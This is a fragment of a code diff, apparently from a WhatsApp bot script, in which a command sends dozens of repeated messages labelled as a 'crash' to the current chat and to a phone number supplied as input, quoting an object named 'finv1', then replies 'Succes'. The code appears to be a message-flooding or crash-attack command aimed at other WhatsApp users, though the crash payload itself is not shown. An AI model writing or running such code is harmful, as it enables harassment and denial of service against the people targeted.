-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:finv1})
 await m.reply(`Succes`)
 default:
 if (budy.startsWith('=>')) {
